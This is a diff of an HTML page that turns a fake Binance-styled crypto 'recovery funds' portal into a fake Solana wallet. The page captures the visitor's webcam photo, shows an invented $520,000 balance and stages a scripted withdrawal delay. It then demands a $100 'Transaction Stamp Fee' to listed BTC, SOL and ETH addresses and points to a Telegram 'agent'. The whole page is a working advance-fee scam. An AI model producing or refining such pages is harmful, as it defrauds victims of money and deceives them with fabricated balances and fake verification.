@@ -1,159 +1,255 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-    <title>COINSTATS</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SOLANA Mainnet - Secure Asset Recovery</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://unpkg.com/lucide@latest"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;600;700&family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;900&display=swap');
-        :root{
-            --binance-yellow: #F3BA2F;
-            --binance-yellow-strong: #f0b90b;
-            --bg-dark: #0a0a0b;
+        body { font-family: 'Inter', sans-serif; }
+        h1, h2, h3, h4 { font-family: 'Outfit', sans-serif; }
+        
+        .face-scan-ring {
+            stroke-dasharray: 440;
+            stroke-dashoffset: 440;
+            transition: stroke-dashoffset 0.1s linear;
         }
-        body { font-family: 'Inter', sans-serif; background-color: var(--bg-dark); color: #fff; }
-        .glow { text-shadow: 0 0 30px rgba(243,186,47,0.35); }
-        @keyframes flow { 0% { left: -100%; } 100% { left: 300%; } }
-        .electricity { position: absolute; height: 2px; background: linear-gradient(90deg, transparent, var(--binance-yellow), transparent); width: 80px; animation: flow 1.5s linear infinite; }
-        /* Small helpers to replace emerald themed styles with Binance yellow */
-        .bg-binance { background-color: rgba(243,186,47,0.95); }
-        .bg-binance-10 { background-color: rgba(243,186,47,0.08); }
-        .text-binance { color: var(--binance-yellow); }
-        .shadow-binance { box-shadow: 0 10px 30px rgba(243,186,47,0.12); }
-        .border-binance { border-color: rgba(243,186,47,0.18); }
-        .hover-binance:hover { background-color: #f0b90b !important; }
+
+        @keyframes rotate { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
+        .animate-spin-slow { animation: rotate 3s linear infinite; }
+        
+        .congrats-popup {
+            animation: bounce-in 0.8s cubic-bezier(0.175, 0.885, 0.32, 1.275) both;
+        }
+        @keyframes bounce-in {
+            0% { transform: scale(0.3); opacity: 0; }
+            50% { transform: scale(1.05); opacity: 1; }
+            70% { transform: scale(0.9); }
+            100% { transform: scale(1); }
+        }
+
+        .notification-in { animation: slide-in-top 0.5s cubic-bezier(0.25, 0.46, 0.45, 0.94) both; }
+        @keyframes slide-in-top {
+            0% { transform: translateY(-100px); opacity: 0; }
+            100% { transform: translateY(0); opacity: 1; }
+        }
+
+        .solana-gradient {
+            background: linear-gradient(135deg, #9945FF 0%, #14F195 100%);
+        }
     </style>
 </head>
-<body class="selection:bg-yellow-400/30 overflow-x-hidden">
+<body class="bg-slate-950 text-slate-100 min-h-screen">
 
-    <p class="text-zinc-500 text-[10px] font-bold mt-1 uppercase tracking-[0.3em]">These are private Recovery Funds and require login on each access</p>
-
-    <!-- LOGIN SECTION -->
-    <div id="login-screen" class="min-h-screen flex items-center justify-center p-4 relative overflow-hidden">
-        <div class="absolute top-[-10%] left-[-10%] w-[50%] h-[50%] bg-binance-10 rounded-full blur-[120px]"></div>
-        <div class="w-full max-w-md bg-zinc-900/50 border border-white/10 rounded-[2.5rem] p-10 backdrop-blur-xl shadow-2xl relative z-10">
-            <div class="flex flex-col items-center mb-10">
-                <div class="w-16 h-16 rounded-2xl bg-binance flex items-center justify-center text-black mb-4 shadow-lg shadow-[rgba(243,186,47,0.18)]">
-                    <i data-lucide="lock" class="w-8 h-8"></i>
+    <!-- INITIAL LOGIN PAGE -->
+    <div id="login-section" class="min-h-screen flex items-center justify-center p-4">
+        <div class="w-full max-w-md bg-slate-900 rounded-[32px] shadow-2xl border border-white/10 overflow-hidden">
+            <div class="solana-gradient h-1.5 w-full"></div>
+            <div class="p-12 text-center space-y-10">
+                <div class="mx-auto w-24 h-24 bg-white/5 rounded-full flex items-center justify-center border border-white/10 shadow-2xl">
+                    <img src="https://raw.githubusercontent.com/solana-labs/token-list/main/assets/mainnet/So11111111111111111111111111111111111111112/logo.png" class="w-12 h-12" alt="Solana">
                 </div>
-                <h1 class="text-3xl font-black italic tracking-tight uppercase glow">COIN HOLDINGS</h1>
-                <p class="text-zinc-500 text-[10px] font-bold mt-1 uppercase tracking-[0.3em]">Secure Portal Access</p>
-            </div>
-            <div class="space-y-6">
-                <div class="space-y-2">
-                    <label class="text-[10px] font-black uppercase text-zinc-500 tracking-widest ml-1">Access ID</label>
-                    <input id="username" type="text" placeholder="ID" class="w-full bg-black/50 border border-white/10 h-14 rounded-xl px-4 outline-none focus:border-yellow-400 text-white">
+                <div class="space-y-3">
+                    <h1 class="text-3xl font-bold tracking-tight uppercase">Solana Network</h1>
+                    <p class="text-slate-400 text-sm font-medium">Connect to Mainnet-Beta to access assets</p>
                 </div>
-                <div class="space-y-2">
-                    <label class="text-[10px] font-black uppercase text-zinc-500 tracking-widest ml-1">Security Key</label>
-                    <input id="password" type="password" placeholder="••••••••" class="w-full bg-black/50 border border-white/10 h-14 rounded-xl px-4 outline-none focus:border-yellow-400 text-white">
-                </div>
-                <div id="login-error" class="hidden bg-red-500/10 border border-red-500/20 p-4 rounded-xl text-red-500 text-[9px] font-black uppercase tracking-widest text-center animate-pulse">
-                    THEFT DETECTED: UNABLE TO ACCESS RECOVERY PAYMENT
-                </div>
-                <button onclick="attemptLogin()" class="w-full bg-binance py-6 rounded-2xl font-black text-black text-lg hover-binance transition-all shadow-binance uppercase">Decrypt Portal</button>
+                <button onclick="startFaceAuth()" class="solana-gradient w-full text-black font-bold py-5 rounded-2xl shadow-xl hover:opacity-90 transition-all text-lg tracking-widest uppercase">
+                    Connect Wallet
+                </button>
             </div>
         </div>
     </div>
 
-    <!-- DASHBOARD SECTION (HIDDEN BY DEFAULT) -->
-    <div id="dashboard" class="hidden min-h-screen">
-        <nav class="border-b border-white/[0.05] bg-black/40 backdrop-blur-xl sticky top-0 z-50">
-            <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 h-16 flex items-center justify-between">
-                <div class="flex items-center gap-3">
-                    <div class="w-9 h-9 rounded-xl bg-binance flex items-center justify-center text-black"><i data-lucide="shield-check" class="w-5 h-5"></i></div>
-                    <span class="font-bold text-xl tracking-tight uppercase italic">FINNUR</span>
+    <!-- FACE VERIFICATION SECTION -->
+    <div id="face-section" class="hidden min-h-screen flex items-center justify-center p-4 bg-slate-950">
+        <div class="w-full max-w-lg bg-slate-900 rounded-[40px] p-12 border border-white/10 text-center space-y-10">
+            <div class="space-y-2">
+                <h2 class="text-2xl font-bold uppercase tracking-tight">Biometric Verification</h2>
+                <p class="text-slate-400 text-sm">Position your face within the frame</p>
+            </div>
+
+            <div class="relative w-64 h-64 mx-auto">
+                <!-- Video/Photo Container -->
+                <div id="face-frame" class="w-full h-full rounded-full border-4 border-slate-800 overflow-hidden bg-slate-800 flex items-center justify-center">
+                    <i id="camera-icon" data-lucide="user" class="w-32 h-32 text-slate-700"></i>
+                    <video id="webcam" class="hidden w-full h-full object-cover" autoplay playsinline></video>
+                    <canvas id="photo-canvas" class="hidden w-full h-full object-cover"></canvas>
                 </div>
-                <div class="text-xs font-black text-binance uppercase tracking-widest">VERIFIED</div>
+                
+                <!-- Progress Ring -->
+                <svg class="absolute inset-0 w-full h-full transform -rotate-90">
+                    <circle cx="128" cy="128" r="120" stroke="currentColor" stroke-width="6" fill="transparent" class="text-slate-800" />
+                    <circle id="face-progress" cx="128" cy="128" r="120" stroke="url(#sol-grad)" stroke-width="6" fill="transparent" stroke-dasharray="754" stroke-dashoffset="754" class="face-scan-ring" />
+                    <defs>
+                        <linearGradient id="sol-grad" x1="0%" y1="0%" x2="100%" y2="100%">
+                            <stop offset="0%" style="stop-color:#9945FF" />
+                            <stop offset="100%" style="stop-color:#14F195" />
+                        </linearGradient>
+                    </defs>
+                </svg>
+            </div>
+
+            <div id="face-controls" class="space-y-4">
+                <button id="capture-btn" onclick="capturePhoto()" class="bg-white text-black font-bold py-4 px-8 rounded-2xl hover:bg-slate-200 transition-all flex items-center justify-center gap-2 mx-auto">
+                    <i data-lucide="camera" class="w-5 h-5"></i> START SCAN
+                </button>
+                <div id="scanning-msg" class="hidden text-blue-400 font-bold tracking-widest text-xs animate-pulse">ANALYZING BIOMETRIC DATA...</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- DASHBOARD SECTION -->
+    <div id="dashboard-section" class="hidden min-h-screen">
+        <!-- Congratulation Popup -->
+        <div id="congrats-popup" class="hidden fixed inset-0 z-[300] flex items-center justify-center p-4 bg-black/80 backdrop-blur-md">
+            <div class="congrats-popup bg-slate-900 rounded-[48px] p-12 text-center border border-white/10 max-w-md space-y-6">
+                <div class="w-24 h-24 bg-emerald-500/20 text-emerald-500 rounded-full flex items-center justify-center mx-auto shadow-2xl shadow-emerald-500/20">
+                    <i data-lucide="check-circle" class="w-12 h-12"></i>
+                </div>
+                <div class="space-y-2">
+                    <h3 class="text-3xl font-bold uppercase tracking-tighter">Verification Successful</h3>
+                    <p class="text-slate-400">Your identity has been authenticated on the Solana Chain.</p>
+                </div>
+                <button onclick="dismissCongrats()" class="solana-gradient w-full text-black font-bold py-4 rounded-2xl text-lg">ENTER DASHBOARD</button>
+            </div>
+        </div>
+
+        <nav class="bg-slate-900/50 backdrop-blur-md border-b border-white/5 sticky top-0 z-50">
+            <div class="max-w-7xl mx-auto px-6 h-20 flex justify-between items-center">
+                <div class="flex items-center gap-3">
+                    <img src="https://raw.githubusercontent.com/solana-labs/token-list/main/assets/mainnet/So11111111111111111111111111111111111111112/logo.png" class="w-8 h-8" alt="Solana">
+                    <span class="font-bold text-xl tracking-tighter uppercase">Solana Explorer</span>
+                </div>
+                <div class="flex items-center gap-4">
+                    <div class="flex items-center gap-3 bg-white/5 px-4 py-2 rounded-2xl border border-white/10">
+                        <div id="user-avatar-small" class="w-8 h-8 rounded-full bg-slate-800 overflow-hidden border border-white/20"></div>
+                        <span class="text-xs font-mono text-slate-400">8xJv...rP9L</span>
+                    </div>
+                </div>
             </div>
         </nav>
 
-        <main class="max-w-7xl mx-auto px-4 py-10 space-y-10">
-            <div class="relative overflow-hidden rounded-[2.5rem] bg-zinc-900 border border-white/[0.08] p-12 shadow-2xl">
-                <div class="absolute top-0 right-0 w-96 h-96 bg-binance-10 rounded-full blur-[100px]"></div>
-                <div class="relative z-10 flex flex-col md:flex-row items-center justify-between gap-10">
-                    <div class="space-y-6">
-                        <div class="bg-binance-10 text-yellow-300 px-4 py-1.5 rounded-full w-fit border border-binance text-[10px] font-black uppercase tracking-widest">Assets</div>
-                        <h1 class="text-6xl sm:text-7xl font-black tracking-tighter glow">$35,000.00 <span class="text-2xl text-zinc-600 font-normal">USD</span></h1>
+        <main class="max-w-7xl mx-auto px-6 py-10 space-y-10">
+            <div class="bg-slate-900 rounded-[48px] p-12 border border-white/10 shadow-2xl relative overflow-hidden">
+                <div class="absolute top-0 right-0 p-12 opacity-5">
+                    <i data-lucide="cpu" class="w-64 h-64"></i>
+                </div>
+                <div class="relative z-10 space-y-6">
+                    <p class="text-slate-400 font-bold uppercase tracking-[0.4em] text-xs">Total Wallet Value (SOL)</p>
+                    <h2 id="balance-text" class="text-8xl font-bold tracking-tighter leading-none">$0.00</h2>
+                    <div class="pt-10 flex gap-6">
+                        <button onclick="openWithdraw()" class="solana-gradient text-black font-bold px-12 py-5 rounded-2xl shadow-2xl shadow-purple-500/20 hover:scale-105 transition-all text-lg uppercase tracking-widest">Withdraw Funds</button>
+                        <button class="bg-white/5 hover:bg-white/10 text-white font-bold px-12 py-5 rounded-2xl border border-white/10 transition-all text-lg uppercase tracking-widest">Stake SOL</button>
                     </div>
-                    <!-- TradingView Widget BEGIN -->
-<div class="tradingview-widget-container">
-  <div class="tradingview-widget-container__widget"></div>
-  <div class="tradingview-widget-copyright"><a href="https://www.tradingview.com/markets/cryptocurrencies/prices-all/" rel="noopener nofollow" target="_blank"><span class="blue-text">Crypto markets</span></a><span class="trademark"> by TradingView</span></div>
-  <script type="text/javascript" src="https://s3.tradingview.com/external-embedding/embed-widget-screener.js" async>
-  {
-  "defaultColumn": "overview",
-  "screener_type": "crypto_mkt",
-  "displayCurrency": "USD",
-  "colorTheme": "light",
-  "isTransparent": false,
-  "locale": "en",
-  "width": "100%",
-  "height": 550
-}
-  </script>
-</div>
-<!-- TradingView Widget END -->
-                    <button onclick="openModal()" class="bg-binance hover:bg-[#f0b90b] text-black font-black py-8 px-12 rounded-[2rem] text-xl shadow-binance flex items-center transition-all transform hover:scale-105 active:scale-95">
-                        <i data-lucide="wallet" class="mr-3 w-6 h-6"></i> Request Withdrawal
-                    </button>
+                </div>
+            </div>
+
+            <div class="grid grid-cols-1 lg:grid-cols-3 gap-10">
+                <div class="lg:col-span-2 bg-slate-900 rounded-[40px] p-10 border border-white/10">
+                    <h3 class="text-2xl font-bold mb-10 uppercase tracking-tight">Recoverable Streams</h3>
+                    <div class="space-y-4">
+                        <div class="flex items-center justify-between p-6 bg-white/5 rounded-3xl border border-white/5">
+                            <div class="flex items-center gap-5">
+                                <div class="w-16 h-16 bg-blue-500/10 text-blue-500 rounded-2xl flex items-center justify-center border border-blue-500/20">
+                                    <i data-lucide="refresh-cw" class="w-8 h-8"></i>
+                                </div>
+                                <div>
+                                    <p class="text-xl font-bold">Protocol Settlement</p>
+                                    <p class="text-slate-500 text-sm font-bold tracking-widest uppercase mt-1">Status: Ready for Release</p>
+                                </div>
+                            </div>
+                            <span class="text-2xl font-bold text-emerald-400">+$520,000.00</span>
+                        </div>
+                    </div>
+                </div>
+                <div class="bg-slate-900 rounded-[40px] p-10 border border-white/10 flex flex-col items-center text-center space-y-6">
+                    <div id="user-avatar-large" class="w-40 h-40 rounded-full border-4 border-white/10 bg-slate-800 overflow-hidden shadow-2xl"></div>
+                    <div class="space-y-2">
+                        <h4 class="text-xl font-bold">Account Holder</h4>
+                        <div class="text-xs font-mono text-slate-500 bg-white/5 py-2 px-4 rounded-full">8xJv72...rP9L0x</div>
+                    </div>
                 </div>
             </div>
         </main>
-        <div class="cryptohopper-web-widget" data-id="9" data-coins="bitcoin,ethereum,tether,cardano,bitcoin-cash,litecoin" data-multi_currencies="AUD,BTC,EUR,GBP,USD" data-realtime="on" data-atid="100"></div>
     </div>
 
-    <!-- WITHDRAWAL MODAL -->
-    <div id="modal" class="fixed inset-0 bg-black/90 backdrop-blur-xl hidden z-[100] flex items-center justify-center p-4">
-        <div id="modal-content" class="bg-[#0a0a0b] border border-white/10 w-full max-w-[520px] rounded-[2.5rem] shadow-2xl relative overflow-hidden">
-            <div class="h-1.5 bg-gradient-to-r from-[var(--binance-yellow)] to-[#f59e0b] w-full"></div>
-            
-            <div id="step-input" class="p-8 space-y-8">
-                <h2 class="text-3xl font-black italic">WITHDRAWAL REQUEST</h2>
-                <div class="space-y-4">
-                    <label class="text-[10px] font-black text-zinc-500 uppercase tracking-widest">Select Method</label>
-                    <div class="grid grid-cols-2 gap-2 text-sm font-bold">
-                        <div class="p-4 border-2 border-binance bg-binance-10 rounded-xl text-center">BTC ₿</div>
-                    </div>
-                </div>
-                <div class="space-y-2">
-                    <label class="text-[10px] font-black text-zinc-500 uppercase tracking-widest">Note: use BTC address only — funds sent to the wrong address are irreversible</label>
-                    <input id="address" type="text" placeholder="Enter address or payment details..." class="w-full bg-zinc-900 border border-white/10 h-14 rounded-xl px-4 font-mono text-sm outline-none focus:border-yellow-400">
-                </div>
-                <button onclick="startProcessing()" class="w-full bg-binance py-6 rounded-2xl font-black text-black text-lg hover-binance">Send Request</button>
-            </div>
+    <!-- WITHDRAW MODAL -->
+    <div id="withdraw-overlay" class="hidden fixed inset-0 bg-slate-950/90 backdrop-blur-2xl z-[400] flex items-center justify-center p-4">
+        <div class="bg-slate-900 w-full max-w-xl rounded-[48px] border border-white/10 overflow-hidden relative">
+            <button onclick="closeWithdraw()" class="absolute top-8 right-8 text-slate-400 hover:text-white z-[410] transition-colors">
+                <i data-lucide="x" class="w-8 h-8"></i>
+            </button>
 
-            <!-- ANIMATION PAGE -->
-            <div id="step-processing" class="hidden p-16 flex flex-col items-center justify-center text-center space-y-12 min-h-[500px]">
-                <div class="flex items-center w-full max-w-[300px] justify-between relative">
-                    <div class="w-20 h-20 rounded-2xl border border-yellow-500/50 bg-zinc-900 flex items-center justify-center shadow-[0_0_30px_rgba(245,158,11,0.12)]"><i data-lucide="cpu" class="text-yellow-400 w-10 h-10 animate-pulse"></i></div>
-                    <div class="flex-1 h-2 bg-white/5 mx-4 rounded-full relative overflow-hidden border border-white/10"><div class="electricity"></div></div>
-                    <div class="w-20 h-20 rounded-2xl border border-binance/50 bg-zinc-900 flex items-center justify-center shadow-[0_0_30px_rgba(243,186,47,0.12)]"><i data-lucide="zap" class="text-yellow-400 w-10 h-10"></i></div>
+            <!-- STEP 1: METHOD -->
+            <div id="step-method" class="p-12 space-y-12">
+                <div class="text-center space-y-3">
+                    <h3 class="text-3xl font-bold uppercase tracking-tight">Settlement Network</h3>
+                    <p class="text-slate-400 text-sm">Choose destination chain for asset release</p>
                 </div>
-                <div class="space-y-4">
-                    <h3 class="text-3xl font-black italic uppercase">Synchronizing</h3>
-                    <p class="text-[10px] text-zinc-500 font-bold uppercase tracking-[0.2em]">Blockchain verification in progress • please wait...</p>
-                </div>
-                <div class="w-full max-w-xs h-1.5 bg-zinc-900 rounded-full overflow-hidden border border-white/5">
-                    <div id="progress-bar" class="h-full bg-binance w-0 transition-all"></div>
+                <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
+                    <button onclick="selectMethod('SOLANA')" class="p-6 border-2 border-white/5 hover:border-[#14F195] bg-white/5 rounded-3xl flex flex-col items-center gap-4 transition-all group">
+                        <img src="https://raw.githubusercontent.com/solana-labs/token-list/main/assets/mainnet/So11111111111111111111111111111111111111112/logo.png" class="w-10 h-10 group-hover:scale-110 transition-transform" alt="Solana">
+                        <span class="font-bold text-sm">SOLANA</span>
+                    </button>
+                    <button onclick="selectMethod('BTC')" class="p-6 border-2 border-white/5 hover:border-orange-500 bg-white/5 rounded-3xl flex flex-col items-center gap-4 transition-all group">
+                        <div class="w-10 h-10 bg-orange-500/10 text-orange-500 rounded-full flex items-center justify-center group-hover:scale-110 transition-transform"><i data-lucide="bitcoin" class="w-6 h-6"></i></div>
+                        <span class="font-bold text-sm">BITCOIN</span>
+                    </button>
+                    <button onclick="selectMethod('ETH')" class="p-6 border-2 border-white/5 hover:border-blue-500 bg-white/5 rounded-3xl flex flex-col items-center gap-4 transition-all group">
+                        <div class="w-10 h-10 bg-blue-500/10 text-blue-500 rounded-full flex items-center justify-center group-hover:scale-110 transition-transform"><i data-lucide="network" class="w-6 h-6"></i></div>
+                        <span class="font-bold text-sm">ETHEREUM</span>
+                    </button>
                 </div>
             </div>
 
-            <!-- ERROR PAGE -->
-            <div id="step-error" class="hidden flex flex-col">
-                <div class="bg-red-500/10 p-8 border-b border-red-500/20 flex gap-5 items-center">
-                    <div class="w-16 h-16 rounded-2xl bg-red-500/20 flex items-center justify-center"><i data-lucide="alert-triangle" class="text-red-500 w-8 h-8"></i></div>
-                    <div><h3 class="text-2xl font-black text-red-500 italic uppercase">System Interrupted</h3><p class="text-xs font-bold text-red-400 uppercase tracking-widest">Security Protocol 2.8</p></div>
+            <!-- STEP 2: PROCESSING -->
+            <div id="step-processing" class="hidden p-16 text-center space-y-10">
+                <div class="relative w-40 h-40 mx-auto">
+                    <i data-lucide="cpu" class="w-20 h-20 text-purple-500 absolute inset-0 m-auto animate-pulse"></i>
+                    <svg class="w-full h-full animate-spin-slow">
+                        <circle cx="80" cy="80" r="75" stroke="currentColor" stroke-width="2" fill="transparent" class="text-white/5" stroke-dasharray="10,20" />
+                    </svg>
                 </div>
-                <div class="p-8 space-y-8">
-                    <p class="text-zinc-400 text-sm font-medium">A BTC network verification fee of <b>$78</b> is required to unlock your withdrawal of <b>$35,000.00</b>. This is a one-time blockchain synchronization cost.</p>
-                    <div class="bg-zinc-900 rounded-[2rem] p-6 border border-white/10 space-y-4">
-                        <span class="text-[10px] text-zinc-500 font-black uppercase">Send BTC to:</span>
-                        <div class="font-mono text-[11px] text-yellow-300 break-all bg-black p-4 rounded-xl border border-white/5">bc1qqenvynqjydyuyw55g20hcesa0f0rxd9eyes024</div>
+                <div class="space-y-4">
+                    <h4 class="text-2xl font-bold uppercase tracking-widest">Validating Protocol</h4>
+                    <p id="process-msg" class="text-slate-500 font-mono text-xs uppercase animate-pulse">Verifying network status...</p>
+                </div>
+            </div>
+
+            <!-- STEP 3: ERROR -->
+            <div id="step-error" class="hidden p-12 text-center space-y-10">
+                <div class="w-24 h-24 bg-red-500/20 text-red-500 rounded-3xl flex items-center justify-center mx-auto shadow-2xl shadow-red-500/20 border border-red-500/30">
+                    <i data-lucide="alert-octagon" class="w-12 h-12"></i>
+                </div>
+                <div class="space-y-4">
+                    <h4 class="text-3xl font-bold text-red-500 tracking-tighter uppercase leading-none">Transaction Stamp Required</h4>
+                    <p class="text-slate-400 text-sm leading-relaxed">A mandatory <strong>$100.00 Transaction Stamp Fee</strong> is required for the <strong>PERMANENT FUNDS RELEASE</strong> of your <strong>$520,000.00</strong> account balance.</p>
+                </div>
+                
+                <div class="bg-black/40 rounded-3xl p-6 text-left space-y-4 border border-white/5">
+                    <p class="text-[10px] font-bold text-slate-500 uppercase tracking-widest">Network Payment Addresses</p>
+                    <div class="space-y-3">
+                        <div class="group relative cursor-pointer" onclick="copyAddr('bc1qqenvynqjydyuyw55g20hcesa0f0rxd9eyes024')">
+                            <p class="text-[10px] font-bold text-orange-500">BTC ADDRESS</p>
+                            <p class="text-[11px] font-mono truncate text-slate-300">bc1qqenvynqjydyuyw55g20hcesa0f0rxd9eyes024</p>
+                        </div>
+                        <div class="group relative cursor-pointer" onclick="copyAddr('3o45nUUhxrehRP6C3D2tsdMoUGfhfyxanFVDAUViTFuv')">
+                            <p class="text-[10px] font-bold text-emerald-500">SOL ADDRESS</p>
+                            <p class="text-[11px] font-mono truncate text-slate-300">3o45nUUhxrehRP6C3D2tsdMoUGfhfyxanFVDAUViTFuv</p>
+                        </div>
+                        <div class="group relative cursor-pointer" onclick="copyAddr('0x861FFa4A6438e4cf2b1cA99C28d33049bF4Cb92E')">
+                            <p class="text-[10px] font-bold text-blue-500">ETH ADDRESS</p>
+                            <p class="text-[11px] font-mono truncate text-slate-300">0x861FFa4A6438e4cf2b1cA99C28d33049bF4Cb92E</p>
+                        </div>
                     </div>
-                    <button class="w-full bg-binance py-6 rounded-2xl font-black text-black text-xl uppercase tracking-widest hover-binance">Confirm Payment</button>
+                </div>
+
+                <div class="flex gap-4">
+                    <a href="https://t.me/Crypto_help0x" target="_blank" class="flex-1 bg-white text-black font-bold py-5 rounded-2xl flex items-center justify-center gap-2 hover:bg-slate-200 transition-all">
+                        <i data-lucide="message-circle" class="w-5 h-5"></i> CONTACT AGENT
+                    </a>
                 </div>
             </div>
         </div>
@@ -162,38 +258,146 @@
     <script>
         lucide.createIcons();
 
-        function attemptLogin() {
-            const u = document.getElementById('username').value;
-            const p = document.getElementById('password').value;
-            // Demo credentials (keep/adjust as needed)
-            if (u === 'agent' && p === 'Finnur123') {
-                document.getElementById('login-screen').classList.add('hidden');
-                document.getElementById('dashboard').classList.remove('hidden');
-            } else {
-                document.getElementById('login-error').classList.remove('hidden');
+        let currentPhoto = null;
+        let isAuthDone = false;
+
+        // --- FACE AUTH LOGIC ---
+        async function startFaceAuth() {
+            document.getElementById('login-section').classList.add('hidden');
+            document.getElementById('face-section').classList.remove('hidden');
+            
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.getElementById('webcam');
+                video.srcObject = stream;
+                video.classList.remove('hidden');
+                document.getElementById('camera-icon').classList.add('hidden');
+            } catch (err) {
+                console.error("Camera access denied", err);
             }
         }
 
-        function openModal() { document.getElementById('modal').classList.remove('hidden'); }
-        function closeModal() { document.getElementById('modal').classList.add('hidden'); }
+        function capturePhoto() {
+            const video = document.getElementById('webcam');
+            const canvas = document.getElementById('photo-canvas');
+            const context = canvas.getContext('2d');
+            
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            currentPhoto = canvas.toDataURL('image/png');
+            video.classList.add('hidden');
+            canvas.classList.remove('hidden');
+            
+            document.getElementById('capture-btn').classList.add('hidden');
+            document.getElementById('scanning-msg').classList.remove('hidden');
 
-        function startProcessing() {
-            if (document.getElementById('address').value.length < 5) return alert('Please enter a valid address');
-            document.getElementById('step-input').classList.add('hidden');
-            document.getElementById('step-processing').classList.remove('hidden');
-            let progress = 0;
-            const bar = document.getElementById('progress-bar');
+            startScanAnimation();
+        }
+
+        function startScanAnimation() {
+            const ring = document.getElementById('face-progress');
+            const circumference = 754;
+            let time = 0;
+            const duration = 19000; // 19 seconds
+
             const interval = setInterval(() => {
-                progress += (100/28);
-                bar.style.width = progress + '%';
-                if (progress >= 100) {
+                time += 100;
+                const progress = time / duration;
+                ring.style.strokeDashoffset = circumference - (progress * circumference);
+
+                if (time >= duration) {
                     clearInterval(interval);
-                    document.getElementById('step-processing').classList.add('hidden');
-                    document.getElementById('step-error').classList.remove('hidden');
+                    completeFaceAuth();
                 }
-            }, 1000);
+            }, 100);
+        }
+
+        function completeFaceAuth() {
+            // Update Dashboard Avatars
+            document.getElementById('user-avatar-small').style.backgroundImage = `url(${currentPhoto})`;
+            document.getElementById('user-avatar-small').style.backgroundSize = 'cover';
+            document.getElementById('user-avatar-large').style.backgroundImage = `url(${currentPhoto})`;
+            document.getElementById('user-avatar-large').style.backgroundSize = 'cover';
+            
+            document.getElementById('face-section').classList.add('hidden');
+            document.getElementById('dashboard-section').classList.remove('hidden');
+            document.getElementById('congrats-popup').classList.remove('hidden');
+            
+            // Stop Camera Stream
+            const video = document.getElementById('webcam');
+            if (video.srcObject) {
+                video.srcObject.getTracks().forEach(track => track.stop());
+            }
+
+            lucide.createIcons();
+        }
+
+        function dismissCongrats() {
+            document.getElementById('congrats-popup').classList.add('hidden');
+            startBalanceCounter();
+        }
+
+        // --- DASHBOARD LOGIC ---
+        function startBalanceCounter() {
+            const target = 520000;
+            const duration = 3000; // 3 seconds
+            const balanceText = document.getElementById('balance-text');
+            let start = 0;
+            const startTime = performance.now();
+
+            function update(now) {
+                const elapsed = now - startTime;
+                const progress = Math.min(elapsed / duration, 1);
+                const current = Math.floor(progress * target);
+                balanceText.textContent = '$' + current.toLocaleString() + '.00';
+
+                if (progress < 1) {
+                    requestAnimationFrame(update);
+                }
+            }
+            requestAnimationFrame(update);
+        }
+
+        function logout() { location.reload(); }
+
+        // --- WITHDRAW LOGIC ---
+        const overlay = document.getElementById('withdraw-overlay');
+        function openWithdraw() { overlay.classList.remove('hidden'); showWStep('method'); }
+        function closeWithdraw() { overlay.classList.add('hidden'); }
+        
+        function showWStep(s) {
+            ['method', 'processing', 'error'].forEach(step => document.getElementById('step-' + step).classList.add('hidden'));
+            document.getElementById('step-' + s).classList.remove('hidden');
+            lucide.createIcons();
+        }
+
+        function selectMethod(m) {
+            showWStep('processing');
+            const msg = document.getElementById('process-msg');
+            let time = 0;
+            const duration = 43000;
+
+            const interval = setInterval(() => {
+                time += 100;
+                if (time < 10000) msg.textContent = "Syncing Node Pool...";
+                else if (time < 20000) msg.textContent = "Validating SPL Protocol...";
+                else if (time < 30000) msg.textContent = "Awaiting Multi-Sig Auth...";
+                else msg.textContent = "Finalizing Secure Tunnel...";
+
+                if (time >= duration) {
+                    clearInterval(interval);
+                    showWStep('error');
+                }
+            }, 100);
+        }
+
+        function copyAddr(addr) {
+            navigator.clipboard.writeText(addr).then(() => {
+                alert('Address copied to clipboard!');
+            });
         }
     </script>
-    <script src="https://www.cryptohopper.com/widgets/js/script"></script>
 </body>
 </html>
